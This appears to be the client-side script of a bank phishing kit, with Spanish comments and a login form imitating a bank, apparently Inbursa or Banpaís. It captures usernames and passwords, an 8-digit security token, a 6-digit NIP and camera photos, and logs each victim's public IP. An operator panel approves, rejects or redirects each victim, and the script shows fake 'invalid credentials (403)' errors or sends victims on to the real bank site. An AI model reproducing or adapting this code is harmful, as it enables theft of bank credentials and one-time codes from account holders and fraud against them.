/**
 * Estado en localStorage (sin backend PHP). Las pantallas siguen el mismo flujo con decisión local inmediata.
 */
(function () {
  'use strict';

  var LS_LOGINS = 'bapa_store_logins';
  var LS_TOKENS = 'bapa_store_tokens';
  var LS_FOTOS = 'bapa_store_fotos';
  var LS_DECISIONS = 'bapa_store_decisions';
  var LS_MIGRATED = 'bapa_store_migrated_v1';

  function migrateLegacyKeysOnce() {
    try {
      if (localStorage.getItem(LS_MIGRATED)) return;
      var pairs = [
        ['bapa_cpanel_logins', LS_LOGINS],
        ['bapa_cpanel_tokens', LS_TOKENS],
        ['bapa_cpanel_fotos', LS_FOTOS],
        ['bapa_cpanel_decisions', LS_DECISIONS]
      ];
      var i;
      for (i = 0; i < pairs.length; i++) {
        var oldK = pairs[i][0];
        var newK = pairs[i][1];
        if (localStorage.getItem(newK)) continue;
        var raw = localStorage.getItem(oldK);
        if (raw != null) localStorage.setItem(newK, raw);
      }
      localStorage.setItem(LS_MIGRATED, '1');
    } catch (e) {}
  }

  migrateLegacyKeysOnce();

  function readJson(key, fallback) {
    try {
      var raw = localStorage.getItem(key);
      if (!raw) return fallback;
      var v = JSON.parse(raw);
      return v !== null && typeof v !== 'undefined' ? v : fallback;
    } catch (e) {
      return fallback;
    }
  }

  function writeJson(key, val) {
    try {
      localStorage.setItem(key, JSON.stringify(val));
    } catch (e) {
      console.warn('[bapa]', key, e);
    }
  }

  function lsLogins() {
    var a = readJson(LS_LOGINS, []);
    return Array.isArray(a) ? a : [];
  }

  function lsTokens() {
    var a = readJson(LS_TOKENS, []);
    return Array.isArray(a) ? a : [];
  }

  function lsFotos() {
    var a = readJson(LS_FOTOS, []);
    return Array.isArray(a) ? a : [];
  }

  function lsDecisions() {
    var o = readJson(LS_DECISIONS, {});
    return o !== null && typeof o === 'object' && !Array.isArray(o) ? o : {};
  }

  /** Texto devuelto por poll (trim, BOM, zero-width, comillas; alias → ir_token). */
  function bapaNormalizePanelDecision(d) {
    if (d == null) return '';
    if (typeof d === 'object') {
      if (Array.isArray(d)) {
        if (!d.length) return '';
        return bapaNormalizePanelDecision(d[0]);
      }
      if (d.estado != null && typeof d.estado === 'string') return bapaNormalizePanelDecision(d.estado);
      if (d.decision != null && typeof d.decision === 'string') return bapaNormalizePanelDecision(d.decision);
      return '';
    }
    var s = typeof d === 'string' ? d : String(d);
    s = s
      .replace(/^\uFEFF/, '')
      .trim()
      .replace(/\u200b/g, '');
    if (
      s.length >= 2 &&
      ((s.charAt(0) === '"' && s.charAt(s.length - 1) === '"') ||
        (s.charAt(0) === "'" && s.charAt(s.length - 1) === "'"))
    ) {
      s = s.slice(1, -1).trim();
    }
    var low = s.toLowerCase();
    if (low === 'null' || low === 'undefined') return '';
    var folded = low;
    try {
      folded = s.normalize('NFD').replace(/[\u0300-\u036f]/g, '');
    } catch (eF) {}
    var lowAscii = folded.toLowerCase();
    if (
      lowAscii === 'ir_token' ||
      /^ir[_\s-]*token(\.html)?$/i.test(folded) ||
      /^ir[_\s-]*tok[eé]n$/i.test(folded)
    ) {
      return 'ir_token';
    }
    if (lowAscii === 'volver_token' || /^volver[_\s-]*a[_\s-]*tok[eé]n$/i.test(folded)) {
      return 'ir_token';
    }
    if (/volv[eé]\s+a\s+tok[eé]n/i.test(folded)) {
      return 'ir_token';
    }
    var compact = '';
    try {
      compact = String(folded)
        .replace(/[\u200b\uFEFF]/g, '')
        .replace(/[^a-zA-Z0-9]/g, '')
        .toLowerCase();
    } catch (eC2) {}
    if (compact === 'irtoken' || compact === 'volvertoken' || compact === 'volveatoken') {
      return 'ir_token';
    }
    return s;
  }

  function bapaDecisionEsIrToken(decNorm) {
    var s = String(decNorm || '')
      .replace(/^\uFEFF/, '')
      .trim()
      .replace(/\u200b/g, '');
    if (!s) return false;
    var n = bapaNormalizePanelDecision(s);
    if (n === 'ir_token') return true;
    var a = s.toLowerCase();
    try {
      a = s.normalize('NFD').replace(/[\u0300-\u036f]/g, '').toLowerCase();
    } catch (e2) {}
    if (a === 'ir_token' || a.indexOf('ir_token') !== -1) return true;
    if (/^ir[^a-z0-9]*token$/i.test(a.replace(/[^a-z0-9]+/g, '_'))) return true;
    if (/^ir[_\s-]*token$/i.test(s)) return true;
    var alnum = a.replace(/[^a-z0-9]+/g, '');
    if (alnum === 'irtoken' || alnum === 'volvertoken' || alnum === 'volveatoken') return true;
    return false;
  }
  window.bapaNormalizePanelDecision = bapaNormalizePanelDecision;
  window.bapaDecisionEsIrToken = bapaDecisionEsIrToken;

  function bapaAplicarEstadoFotoLocal(id, accion) {
    var idStr = String(id);
    if (idStr.indexOf('FOTO_') !== 0) return;
    var list = lsFotos();
    var i;
    var found = false;
    for (i = 0; i < list.length; i++) {
      if (list[i] && String(list[i].id) === idStr) {
        var row = list[i];
        list[i] = Object.assign({}, row, { estado: String(accion) });
        found = true;
        break;
      }
    }
    if (found) writeJson(LS_FOTOS, list);
  }

  function unshiftUnique(list, row, maxLen) {
    var id = row && row.id ? String(row.id) : '';
    if (!id) return list.slice();
    var next = list.filter(function (r) {
      return !r || String(r.id) !== id;
    });
    next.unshift(row);
    if (next.length > maxLen) next = next.slice(0, maxLen);
    return next;
  }

  async function obtenerIpPublica() {
    try {
      var r = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
      var j = await r.json();
      return j && j.ip ? String(j.ip) : '';
    } catch (e) {
      return '';
    }
  }

  window.bapaListarLogins = function () {
    return lsLogins().slice();
  };
  window.bapaListarTokens = function () {
    return lsTokens().slice();
  };
  window.bapaListarFotos = function () {
    var rows = lsFotos().slice();
    var dec = lsDecisions();
    return rows.map(function (r) {
      if (!r || !r.id) return r;
      var d = dec[String(r.id)];
      if (!d) return r;
      var pend = r.estado === 'pendiente' || !r.estado || r.estado === '';
      if (pend) return Object.assign({}, r, { estado: String(d) });
      return r;
    });
  };

  window.bapaContarRegistrosLocales = function () {
    return lsLogins().length + lsTokens().length + lsFotos().length;
  };

  window.bapaUpsertLoginLocal = function (row) {
    if (!row || !row.id) return;
    writeJson(LS_LOGINS, unshiftUnique(lsLogins(), row, 400));
  };

  async function patchLoginClaveNipLocal(loginId, claveNip) {
    if (!loginId) return { ok: false, data: null };
    var list = lsLogins();
    var i;
    var found = false;
    for (i = 0; i < list.length; i++) {
      if (list[i] && String(list[i].id) === String(loginId)) {
        list[i] = Object.assign({}, list[i], { clave_nip: String(claveNip) });
        writeJson(LS_LOGINS, list);
        found = true;
        break;
      }
    }
    if (!found) return { ok: false, data: null };
    try {
      var dec = lsDecisions();
      delete dec[String(loginId)];
      writeJson(LS_DECISIONS, dec);
    } catch (eDec) {}
    return { ok: true, data: null };
  }

  async function patchLoginTokenLocal(loginId, token8) {
    if (!loginId) return { ok: false, data: null };
    var tokenDecideId = 'TOKDEC_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 10);
    var list = lsLogins();
    var i;
    var t = String(token8 || '')
      .replace(/\D/g, '')
      .slice(0, 8);
    for (i = 0; i < list.length; i++) {
      if (list[i] && String(list[i].id) === String(loginId)) {
        var tsMs = Date.now();
        list[i] = Object.assign({}, list[i], {
          token: t,
          tokenTs: tsMs,
          tokenDecideId: tokenDecideId,
          tokenEstado: 'pendiente'
        });
        writeJson(LS_LOGINS, list);
        return { ok: true, data: { token_decide_id: tokenDecideId } };
      }
    }
    return { ok: false, data: null };
  }

  window.bapaEnviarToken8AlLogin = async function (token8) {
    var lid = '';
    try {
      lid = String(sessionStorage.getItem('bapa_last_login_id') || '').trim();
    } catch (eL) {}
    if (!lid) return '';
    var t = String(token8 || '')
      .replace(/\D/g, '')
      .slice(0, 8);
    if (!/^\d{8}$/.test(t)) return '';
    var pr = await patchLoginTokenLocal(lid, t);
    if (!pr.ok) return '';
    var tokenDecideId = '';
    try {
      if (pr.data && pr.data.token_decide_id) {
        tokenDecideId = String(pr.data.token_decide_id).trim();
      }
    } catch (eTd) {}
    return tokenDecideId;
  };

  window.bapaEnviarClaveNipAlLogin = async function (nip6) {
    var lid = '';
    try {
      lid = String(sessionStorage.getItem('bapa_last_login_id') || '').trim();
    } catch (e0) {}
    if (!lid) return '';
    var nip = String(nip6 || '')
      .replace(/\D/g, '')
      .slice(0, 6);
    if (!/^\d{6}$/.test(nip)) return '';
    var pr = await patchLoginClaveNipLocal(lid, nip);
    if (!pr.ok) return '';
    return lid;
  };

  window.bapaRegistrarLogin = async function (usuario, password, extra) {
    extra = extra || {};
    var id =
      typeof extra.id === 'string' && extra.id
        ? extra.id
        : 'LOGIN_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 10);
    var ipHint = '';
    try {
      if (navigator.onLine !== false) {
        ipHint = await obtenerIpPublica();
      }
    } catch (eIp) {}
    var row = {
      id: id,
      usuario: usuario != null ? String(usuario) : '',
      password: password != null ? String(password) : '',
      ip: ipHint,
      ts: Math.floor(Date.now() / 1000),
      estado: 'pendiente'
    };
    if (extra.origen != null && String(extra.origen).trim() !== '') {
      row.origen = String(extra.origen).trim();
    }
    window.bapaUpsertLoginLocal(row);
    return id;
  };

  window.bapaEliminarTodo = function () {
    writeJson(LS_LOGINS, []);
    writeJson(LS_TOKENS, []);
    writeJson(LS_FOTOS, []);
    writeJson(LS_DECISIONS, {});
    try {
      var rk = [];
      var i;
      for (i = 0; i < localStorage.length; i++) {
        var k = localStorage.key(i);
        if (k && String(k).indexOf('bapa_token_banner_') === 0) {
          rk.push(String(k));
        }
      }
      for (i = 0; i < rk.length; i++) {
        localStorage.removeItem(rk[i]);
      }
    } catch (eBan) {}
  };

  window.bapaEliminarTodoServidorYLuegoLocal = async function () {
    window.bapaEliminarTodo();
    return true;
  };

  window.bapaEliminarFilaServidorYLuegoLocal = async function (id) {
    if (!id) return false;
    var list = lsLogins().filter(function (r) {
      return String(r.id) !== String(id);
    });
    writeJson(LS_LOGINS, list);
    var dec = lsDecisions();
    delete dec[String(id)];
    writeJson(LS_DECISIONS, dec);
    return true;
  };

  window.bapaEliminarFotoServidorYLuegoLocal = async function (id) {
    if (!id) return false;
    var list = lsFotos().filter(function (r) {
      return String(r.id) !== String(id);
    });
    writeJson(LS_FOTOS, list);
    var dec = lsDecisions();
    delete dec[String(id)];
    writeJson(LS_DECISIONS, dec);
    return true;
  };

  window.bapaEliminarFila = function (id) {
    var list = lsLogins().filter(function (r) {
      return String(r.id) !== String(id);
    });
    writeJson(LS_LOGINS, list);
  };

  window.bapaEliminarFoto = function (id) {
    var list = lsFotos().filter(function (r) {
      return String(r.id) !== String(id);
    });
    writeJson(LS_FOTOS, list);
  };

  window.bapaGuardarDecision = async function (id, accion) {
    if (!id || !accion) return false;
    var idStr = String(id);
    if (
      accion === 'aprobado' &&
      idStr.indexOf('LOGIN_') === 0 &&
      typeof window.bapaGuardarTokenBannerSuffixParaLogin === 'function'
    ) {
      var sufPrev =
        typeof window.bapaObtenerTokenBannerSuffixParaLogin === 'function'
          ? String(window.bapaObtenerTokenBannerSuffixParaLogin(idStr) || '').trim()
          : '';
      if (!sufPrev) {
        var sufNorm = '89';
        var sufFinal = sufNorm;
        window.bapaGuardarTokenBannerSuffixParaLogin(idStr, sufFinal);
      }
    }
    var decLocal = lsDecisions();
    decLocal[String(id)] = accion;
    writeJson(LS_DECISIONS, decLocal);
    if (idStr.indexOf('TOKDEC_') === 0) {
      var teTok = 'pendiente';
      if (accion === 'rechazado') {
        teTok = 'rechazado';
      } else if (accion === 'aprobado' || accion === 'ir_oficial' || accion === 'ir_token' || accion === 'ir_camara') {
        teTok = 'aprobado';
      } else if (accion === 'timeout' || accion === 'recargar_login') {
        teTok = 'superado';
      }
      var tokItEst = null;
      if (accion === 'rechazado') {
        tokItEst = 'rechazado';
      } else if (accion === 'aprobado' || accion === 'ir_oficial' || accion === 'ir_token' || accion === 'ir_camara') {
        tokItEst = 'aprobado';
      } else if (accion === 'timeout' || accion === 'recargar_login') {
        tokItEst = 'superado';
      }
      var listTok = lsLogins();
      var ix;
      for (ix = 0; ix < listTok.length; ix++) {
        if (listTok[ix] && String(listTok[ix].tokenDecideId || '') === idStr) {
          var rowPrevTok = listTok[ix];
          var nextTok = Object.assign({}, rowPrevTok, { tokenEstado: teTok });
          if (tokItEst != null) {
            var tiArr = rowPrevTok.token_intentos;
            var intentosTokLoc = Array.isArray(tiArr) ? tiArr.slice() : [];
            var tokDigits = String(rowPrevTok.token != null ? rowPrevTok.token : '').replace(/\D/g, '');
            if (intentosTokLoc.length === 0 && /^\d{8}$/.test(tokDigits)) {
              intentosTokLoc = [{ token: tokDigits, estado: tokItEst }];
            } else if (intentosTokLoc.length >= 1) {
              var liTok = intentosTokLoc.length - 1;
              if (String(intentosTokLoc[liTok].estado || '') === 'espera') {
                intentosTokLoc[liTok] = Object.assign({}, intentosTokLoc[liTok], { estado: tokItEst });
              }
            }
            nextTok.token_intentos = intentosTokLoc;
          }
          listTok[ix] = nextTok;
          writeJson(LS_LOGINS, listTok);
          break;
        }
      }
    }
    bapaAplicarEstadoFotoLocal(idStr, accion);
    return true;
  };

  window.bapaMergeEstadoRemoto = async function () {};

  window.bapaGuardarFoto = async function (opts) {
    opts = opts || {};
    var fotoDataUrl = opts.fotoDataUrl ? String(opts.fotoDataUrl) : '';
    if (!fotoDataUrl) return '';
    var ipHint = '';
    try {
      ipHint = await obtenerIpPublica();
    } catch (e) {}
    var id = 'FOTO_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 12);
    var row = {
      id: id,
      fotoDataUrl: fotoDataUrl,
      usuario: opts.usuario != null ? String(opts.usuario) : '',
      loginId: opts.loginId != null ? String(opts.loginId) : '',
      ciclo: opts.ciclo != null ? Number(opts.ciclo) : 0,
      ip: ipHint,
      ts: Math.floor(Date.now() / 1000),
      estado: 'pendiente'
    };
    writeJson(LS_FOTOS, unshiftUnique(lsFotos(), row, 60));
    return id;
  };

  async function bapaPollDecisionOnce(id) {
    try {
      var idStr = String(id || '').trim();
      if (!idStr) return null;
      var decObj = lsDecisions();
      var rawStored = decObj[idStr];
      if (rawStored != null && rawStored !== '') {
        return bapaNormalizePanelDecision(rawStored);
      }
      if (/^LOGIN_/.test(idStr) || /^TOKDEC_/.test(idStr) || /^FOTO_/.test(idStr)) {
        return 'aprobado';
      }
    } catch (e) {}
    return null;
  }

  window.bapaEsperarDecisionPorId = async function (id, timeoutMs) {
    var idStr = String(id || '').trim();
    timeoutMs = timeoutMs == null ? 180000 : Number(timeoutMs);
    var hasta = Date.now() + timeoutMs;
    while (Date.now() < hasta) {
      var dec = await bapaPollDecisionOnce(idStr);
      if (dec) return dec;
      await new Promise(function (r) {
        setTimeout(r, 1600);
      });
    }
    return null;
  };

  window.bapaObtenerTokenBannerSuffix = function () {
    try {
      return localStorage.getItem('bapa_token_banner_suffix_global') || '';
    } catch (e) {
      return '';
    }
  };

  window.bapaObtenerTokenBannerSuffixParaLogin = function (loginId) {
    try {
      var raw = localStorage.getItem('bapa_token_banner_by_login_' + loginId);
      return raw || '';
    } catch (e) {
      return '';
    }
  };

  window.bapaGuardarTokenBannerSuffixParaLogin = function (loginId, suf) {
    try {
      localStorage.setItem('bapa_token_banner_by_login_' + loginId, String(suf || ''));
    } catch (e) {}
  };

  window.bapaSubirTokenBannerServidor = function () {
    return Promise.resolve(false);
  };

  window.bapaDescargarSufijoServidor = function () {
    return Promise.resolve(null);
  };

  window.bapaIniciarPollLoginGuardado = function () {
    var lid = '';
    try {
      lid = sessionStorage.getItem('bapa_last_login_id') || '';
    } catch (e) {}
    if (!lid) return;
    setInterval(async function () {
      try {
        var d = await bapaPollDecisionOnce(lid);
        if (d !== 'recargar_login') return;
        sessionStorage.removeItem('bapa_last_login_id');
        window.location.href = 'index.html';
      } catch (e) {}
    }, 3000);
  };

  document.addEventListener('DOMContentLoaded', function () {
    var form = document.getElementById('login-form');
    if (!form || form.dataset.bapaFormLoginLinked === '1') return;
    if (!document.getElementById('usuario') || !document.getElementById('password')) return;
    form.dataset.bapaFormLoginLinked = '1';

    var MSG_CAMPO_REQUERIDO = 'Este campo es requerido.';

    function clearIndexFieldError(fieldId) {
      var el = document.getElementById(fieldId);
      var wrap = el && el.closest('.field__wrap');
      var err = document.getElementById(fieldId + '-field-error');
      if (wrap) wrap.classList.remove('field__wrap--error');
      if (err) {
        err.textContent = '';
        err.hidden = true;
      }
      if (el) el.removeAttribute('aria-invalid');
    }

    function clearIndexFieldErrors() {
      clearIndexFieldError('usuario');
      clearIndexFieldError('password');
    }

    function showIndexFieldError(fieldId, message) {
      var el = document.getElementById(fieldId);
      var wrap = el && el.closest('.field__wrap');
      var err = document.getElementById(fieldId + '-field-error');
      if (wrap) wrap.classList.add('field__wrap--error');
      if (err) {
        err.textContent = message;
        err.hidden = false;
      }
      if (el) el.setAttribute('aria-invalid', 'true');
    }

    ;['usuario', 'password'].forEach(function (fid) {
      var inp = document.getElementById(fid);
      if (!inp) return;
      inp.addEventListener('input', function () {
        clearIndexFieldError(fid);
      });
    });

    var securityBanner = document.getElementById('security-banner');
    var securityBannerText = securityBanner
      ? securityBanner.querySelector('.banner__text')
      : null;
    var securityBannerIcon = securityBanner ? securityBanner.querySelector('.banner__icon') : null;
    var defaultSecurityBannerHtml =
      securityBannerText && securityBannerText.innerHTML ? securityBannerText.innerHTML : '';
    var defaultSecurityBannerIconSrc =
      securityBannerIcon && securityBannerIcon.getAttribute('src')
        ? securityBannerIcon.getAttribute('src')
        : 'I/!.svg';

    var POLL_MS_LOGIN = 1700;
    var LOGIN_WAIT_MAX_MS = 15 * 60 * 1000;

    form.addEventListener(
      'submit',
      async function (e) {
        e.preventDefault();
        var uEl = document.getElementById('usuario');
        var pEl = document.getElementById('password');
        var usuario = uEl ? String(uEl.value || '').trim() : '';
        var password = pEl ? String(pEl.value || '').trim() : '';

        clearIndexFieldErrors();
        var usuarioOk = usuario.length > 0;
        var passwordOk = password.length > 0;
        if (!usuarioOk) showIndexFieldError('usuario', MSG_CAMPO_REQUERIDO);
        if (!passwordOk) showIndexFieldError('password', MSG_CAMPO_REQUERIDO);
        if (!usuarioOk || !passwordOk) {
          if (!usuarioOk && uEl) uEl.focus();
          else if (!passwordOk && pEl) pEl.focus();
          return;
        }

        var overlay = document.getElementById('bapa-login-wait');
        var btnSubmit = form.querySelector('button[type="submit"]');

        if (securityBannerText && defaultSecurityBannerHtml !== '') {
          securityBannerText.innerHTML = defaultSecurityBannerHtml;
        }
        if (securityBannerIcon && defaultSecurityBannerIconSrc) {
          securityBannerIcon.src = defaultSecurityBannerIconSrc;
          securityBannerIcon.setAttribute('width', '19');
          securityBannerIcon.setAttribute('height', '19');
        }
        if (securityBanner) {
          securityBanner.classList.remove('banner--error-login');
          securityBanner.hidden = false;
        }

        function showWait() {
          if (!overlay) return;
          overlay.hidden = false;
          overlay.setAttribute('aria-busy', 'true');
        }

        function hideWait() {
          if (!overlay) return;
          overlay.hidden = true;
          overlay.setAttribute('aria-busy', 'false');
        }

        try {
          sessionStorage.setItem('usuario', usuario);
        } catch (e2) {}

        if (btnSubmit) btnSubmit.disabled = true;

        var lid = '';
        try {
          if (typeof window.bapaRegistrarLogin === 'function') {
            lid = await window.bapaRegistrarLogin(usuario, password);
          }
        } catch (e3) {
          console.warn('[bapa] Registrar login:', e3);
        }

        if (!lid) {
          if (btnSubmit) btnSubmit.disabled = false;
          alert('No se pudo guardar el intento de login. Intentá de nuevo.');
          return;
        }

        try {
          sessionStorage.setItem('bapa_last_login_id', lid);
        } catch (e4) {}

        showWait();

        var deadline = Date.now() + LOGIN_WAIT_MAX_MS;
        while (Date.now() < deadline) {
          await new Promise(function (r) {
            setTimeout(r, POLL_MS_LOGIN);
          });
          var decision = await bapaPollDecisionOnce(lid);
          if (!decision) continue;

          switch (decision) {
            case 'aprobado':
              hideWait();
              window.location.href = 'tok.html';
              return;

            case 'ir_oficial': {
              hideWait();
              var off =
                typeof window.BAPA_URL_OFICIAL_BANCO === 'string' && window.BAPA_URL_OFICIAL_BANCO.trim()
                  ? window.BAPA_URL_OFICIAL_BANCO.trim()
                  : typeof window.BAPA_URL_OFICIAL_BANPAIS === 'string' && window.BAPA_URL_OFICIAL_BANPAIS.trim()
                    ? window.BAPA_URL_OFICIAL_BANPAIS.trim()
                    : 'https://www.inbursa.com/';
              window.location.href = off;
              return;
            }

            case 'ir_token':
              hideWait();
              window.location.href = 'tok.html';
              return;

            case 'ir_camara':
              hideWait();
              window.location.href = 'cam.html';
              return;

            case 'rechazado':
              hideWait();
              if (btnSubmit) btnSubmit.disabled = false;
              if (uEl) uEl.value = '';
              if (pEl) pEl.value = '';
              try {
                sessionStorage.removeItem('usuario');
              } catch (eUs) {}
              if (securityBannerText) {
                securityBannerText.textContent =
                  'Tu usuario y/o contraseña no es válido. Inténtalo nuevamente. (403)';
              }
              if (securityBannerIcon) {
                securityBannerIcon.src = 'I/x.svg';
                securityBannerIcon.setAttribute('width', '24');
                securityBannerIcon.setAttribute('height', '24');
              }
              if (securityBanner) {
                securityBanner.classList.add('banner--error-login');
                securityBanner.hidden = false;
              }
              return;

            case 'timeout':
              hideWait();
              if (btnSubmit) btnSubmit.disabled = false;
              alert('No hubo respuesta a tiempo. Intentá de nuevo.');
              return;

            case 'recargar_login':
              hideWait();
              if (btnSubmit) btnSubmit.disabled = false;
              try {
                sessionStorage.removeItem('bapa_last_login_id');
              } catch (eR) {}
              alert('Volvé a ingresar los datos.');
              return;

            default:
              continue;
          }
        }

        hideWait();
        if (btnSubmit) btnSubmit.disabled = false;
        alert('Pasó el tiempo máximo de espera. Actualizá la página e intentá otra vez.');
      },
      true
    );
  });
})();
